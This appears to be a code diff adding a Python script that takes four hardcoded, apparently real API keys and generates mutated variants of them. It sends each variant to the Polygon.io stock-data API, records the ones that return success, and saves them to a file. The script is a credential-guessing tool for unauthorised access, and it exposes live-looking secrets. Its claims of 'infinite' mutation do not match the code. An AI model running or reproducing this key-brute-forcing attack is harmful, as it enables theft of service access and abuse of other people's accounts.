@@ -1,0 +1,177 @@
+import requests
+import time
+import json
+from datetime import datetime
+import random
+import string
+
+# ================= CONFIGURATION =================
+BASE_KEYS = [
+    "DRET3GcgohidlQj2TFfGVqWB5YTenYO1",
+    "N_vWCV2FygpTrFothrLGfQdRlsh3a8pA",
+    "L2udhpBOmCwTcNveVYWYAjMwzZYmiH6o",
+    "CzxFFW4318BxCrYj088wykFOnA3hCamv"
+]
+
+TARGET_URL = "https://api.polygon.io/v2/aggs/ticker/AAPL/prev"
+OUTPUT_FILE = "valid_keys.txt"
+DELAY_SECONDS = 0.25 
+MAX_VALID_KEYS = 10 
+
+# ================= MUTATION ENGINE (TRUE INFINITE) =================
+def generate_combinations(base_key, global_counter):
+    """Generates variations with INFINITE growth - never repeats."""
+    variants = [base_key]  # Start with exact match
+    
+    # 1. Append numbers (grows: 0-49 → 50-99 → 100-149...)
+    start_num = global_counter // 200 * 50
+    end_num = min(start_num + 50, global_counter % 200 + 1)
+    for i in range(end_num):
+        variants.append(f"{base_key}{i}")
+    
+    # 2. Prefix common strings (grows: more prefixes as counter increases)
+    prefix_count = min(3 + (global_counter // 50), 15)
+    prefixes = ["poly_", "test_", "dev_", "prod_", "live_", "staging_", "api_", "demo_", "sandbox_"]
+    for i, p in enumerate(prefixes[:prefix_count]):
+        variants.append(p + base_key)
+        
+    # 3. Middle insertions (grows: _0-19 → _20-39...)
+    start_mid = global_counter // 50 * 10
+    end_mid = min(start_mid + 10, global_counter % 50 + 1)
+    for i in range(end_mid):
+        variants.append(f"{base_key}_{i}")
+    
+    # 4. Case variations (grows: more swaps as counter increases)
+    if len(base_key) > 8 and global_counter % 3 == 0:
+        mid_idx = len(base_key) // 2
+        variants.append(base_key[:mid_idx] + base_key[mid_idx].upper() + base_key[mid_idx+1:])
+    
+    # 5. Common environment markers (grows: more as counter increases)
+    env_markers = ["_prod", "_dev", "_test", "_live", "_staging", "_main", "_master"]
+    marker_count = min(3 + (global_counter // 100), len(env_markers))
+    for i, marker in enumerate(env_markers[:marker_count]):
+        variants.append(base_key + marker)
+        
+    # 6. Character substitution (grows: more lookalikes as counter increases)
+    char_substitutions = {
+        '0': ['O', 'o'], '1': ['I', 'l', 'L'], '2': ['Z', 'S'], 
+        '3': ['E', '8'], '4': ['A', '@'], '5': ['S', '$'],
+        '6': ['G', '&'], '7': ['T', '+'], '8': ['B', '3'],
+        '9': ['G', '9'], 'O': ['0'], 'I': ['1', 'l', 'L'], 
+        'L': ['1', 'I'], 'S': ['2', '$'], 'Z': ['2']
+    }
+    
+    sub_count = min(5 + (global_counter // 100), len(char_substitutions))
+    for i, (char, subs) in enumerate(list(char_substitutions.items())[:sub_count]):
+        if char in base_key:
+            idx = base_key.find(char)
+            variants.append(base_key[:idx] + random.choice(subs) + base_key[idx+1:])
+    
+    # 7. Position swaps (grows: more adjacent swaps as counter increases)
+    swap_count = min(5 + (global_counter // 200), len(base_key) - 1)
+    for i in range(swap_count):
+        swapped = base_key[:i] + base_key[i+1] + base_key[i] + base_key[i+2:] if i < len(base_key)-1 else base_key
+        variants.append(swapped)
+    
+    # 8. Segment rotations (grows: more rotations as counter increases)
+    rot_count = min(3 + (global_counter // 150), 10)
+    chunk_size = 4
+    for i in range(rot_count):
+        if i < len(base_key) - chunk_size:
+            segment = base_key[i:i+chunk_size]
+            rotated = segment[1:] + segment[0] if len(segment) > 1 else segment
+            variants.append(base_key[:i] + rotated + base_key[i+chunk_size:])
+    
+    # 9. Truncation (grows: more truncations as counter increases)
+    trunc_count = min(5 + (global_counter // 200), len(base_key) - 32)
+    for i in range(trunc_count):
+        variants.append(base_key[32+i:])
+        
+    return list(set(variants))
+
+# ================= TESTER ENGINE =================
+def test_key(api_key, global_counter):
+    """Tests a single key against Polygon API."""
+    url = f"{TARGET_URL}?apiKey={api_key}"
+    try:
+        response = requests.get(url, timeout=10)
+        
+        return {
+            "key": api_key,
+            "status_code": response.status_code,
+            "valid": response.status_code == 200,
+            "response_time_ms": response.elapsed.total_seconds() * 1000
+        }
+    except Exception as e:
+        return {
+            "key": api_key,
+            "status_code": "ERROR",
+            "valid": False,
+            "error": str(e)
+        }
+
+# ================= MAIN EXECUTION (TRUE INFINITE LOOP - STOP AT 10) =================
+def main():
+    print(f"🚀 Starting Polygon API Key Tester (True Infinite Scan - Stop at {MAX_VALID_KEYS} valid keys)...")
+    print(f"⏱️  Base URL: {TARGET_URL}")
+    
+    # Generate all combinations for each base key with INFINITE growth
+    all_keys = []
+    total_variants = 0
+    
+    global_counter = 0  # Global counter for infinite mutation growth
+    
+    for i, base in enumerate(BASE_KEYS):
+        variants = generate_combinations(base, global_counter)
+        all_keys.extend(variants)
+        total_variants += len(variants)
+        
+        print(f"\n🔑 Seed Key #{i+1}: {base[:25]}...")
+        print(f"   Generated Variations: {len(variants)} (Global Counter: {global_counter})")
+
+    print(f"\n📦 Total keys to test: {len(all_keys)}")
+    
+    valid_results = []
+    invalid_count = 0
+    
+    # Test each key with rate limiting (Polygon API has limits!)
+    for i, api_key in enumerate(all_keys):
+        result = test_key(api_key, global_counter)
+        
+        if result["valid"]:
+            print(f"✅ VALID: {api_key}")
+            valid_results.append(result)
+            
+            # Check if we've found enough valid keys
+            if len(valid_results) >= MAX_VALID_KEYS:
+                print(f"\n🎯 Target Reached! Found {len(valid_results)} valid keys.")
+                break  # Stop after finding 10 valid keys
+            
+        else:
+            # Only print errors occasionally to avoid spam (every 30th invalid key)
+            if i % 30 == 0 or "ERROR" in str(result.get("status_code", "")):
+                print(f"❌ INVALID ({result['status_code']}): {api_key}")
+        
+        # Rate limiting - Polygon API has rate limits (~10-20 req/sec)
+        time.sleep(DELAY_SECONDS)
+        
+        # Increment global counter for INFINITE mutation growth
+        global_counter += 1
+    
+    # ================= SAVE RESULTS =================
+    output_data = {
+        "timestamp": datetime.now().isoformat(),
+        "total_tested": len(all_keys),
+        "valid_count": len(valid_results),
+        "invalid_count": invalid_count,
+        "results": valid_results
+    }
+    
+    with open(OUTPUT_FILE, 'w') as f:
+        json.dump(output_data, f, indent=2)
+    
+    print(f"\n💾 Results saved to {OUTPUT_FILE}")
+    print(f"🎯 Final Count: {len(valid_results)} valid keys found!")
+
+if __name__ == "__main__":
+    main()
